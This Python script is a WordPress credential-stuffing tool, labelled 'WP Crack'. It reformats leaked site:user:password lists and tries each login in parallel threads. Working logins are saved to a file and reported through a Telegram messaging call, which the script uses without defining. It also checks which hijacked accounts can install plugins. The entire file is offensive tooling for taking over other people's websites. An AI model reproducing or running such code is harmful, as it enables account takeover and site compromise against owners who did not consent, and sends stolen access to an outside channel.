banner = """
   _______  ____    _____             _____  ______   _____
  |__   __||___ \  / ____|    /\     / ____||  ____| / ____|
     | |     __) || |  __    /  \   | (___  | |__   | |
     | |    |__ < | | |_ |  / /\ \   \___ \ |  __|  | |
     | |    ___) || |__| | / ____ \  ____) || |____ | |____
     |_|   |____/  \_____|/_/    \_\|_____/ |______| \_____|
                                    									 
				"""
print(banner)

import os
import re
import sys
from multiprocessing.dummy import Pool as ThreadPool
from requests import request
from colorama import Fore, init

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
frs = Fore.RESET

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}

def convert_url_format(input_string):
    try:
        url_temp = input_string.replace("http://", "http//").replace("https://", "https//")
        url_temp = url_temp.replace("wp-login.php:", "wp-login.php#")
        url_temp = url_temp.replace(":", "@")
        url_temp = url_temp.replace("http//", "http://").replace("https//", "https://")
        return url_temp.strip()
    except Exception as e:
        print(f"Error converting input '{input_string}': {e}")
        return None

def convert_format():
    try:
        input_file = input("Enter Input File: ")
        output_file = input("Enter Output file: ")

        with open(input_file, 'r') as file:
            input_list = file.readlines()

        output_list = [convert_url_format(item) for item in input_list if convert_url_format(item)]

        with open(output_file, 'w') as file:
            for item in output_list:
                file.write(item + "\n")

        print("Conversion successful. Please check the output file.")
    except FileNotFoundError:
        print("File not found.")

def check(url):
    try:
        site, user, passwd = '', '', ''

        if '@' in url and '#' in url:
            site = url.split("#")[0]
            user = url.split("#")[1].split("@")[0]
            passwd = url.split("#")[1].split("@")[1]
        elif url.count('|') == 2:
            data_split = url.split("|")
            site = data_split[0]
            user = data_split[1]
            passwd = data_split[2]
        else:
            raise ValueError("Invalid URL format > " + url)

    except Exception as e:
        print(f' -| Error: {e}')
        return

    try:
        resp = request(method='POST', url=site, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5).text

        if 'Dashboard' in resp:
            message = f'Login Successfully: {url}'
            print(' -| {:<50} --> {}[Login Successfully]'.format(url, fg))
            open("Success-Wordpress.txt", "a").write(f"{site}#{user}@{passwd}\n")
            send_telegram_message(message)
            
            check_plugin_access(site, user, passwd)

        else:
            print(' -| {:<50} --> {}[Login Failed]'.format(site, fr))

    except Exception as e:
        print(' -| {:<50} --> {}[Error]'.format(site, fr))

def check_plugin_access(site, user, passwd):
    plugin_url = site + "/wp-admin/plugin-install.php"
    
    try:
        resp = request(method='POST', url=plugin_url, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5).text
        
        if 'Install Plugins' in resp:
            print(f' -| {site:<50} --> {fg}[Can Install Plugins]')
            open("Install_Plugins.txt", "a").write(f"{site}#{user}@{passwd}\n")
            send_telegram_message(f"{site} can install plugins.")
        else:
            print(f' -| {site:<50} --> {fr}[Cannot Install Plugins]')
    
    except Exception as e:
        print(f' -| Error checking plugin access for {site}: {e}')

def wp_check():
    try:
        file_to_check = input("Enter File: ")
        num_threads = int(input("Enter Threads: "))

        with open(file_to_check, 'r') as file:
            lines = file.read().splitlines()

        pp = ThreadPool(num_threads)
        results = pp.map(check, lines)
        pp.close()
        pp.join()

    except FileNotFoundError:
        print("\n\n[!] File not found:", file_to_check)
        sys.exit(1)

if __name__ == "__main__":
    choice = input("[1] Convert Format\n[2] WP Crack\n\n>>> Enter: ")

    if choice == "1":
        convert_format()
    elif choice == "2":
        wp_check()
    else:
        print("Invalid choice. Please try again.")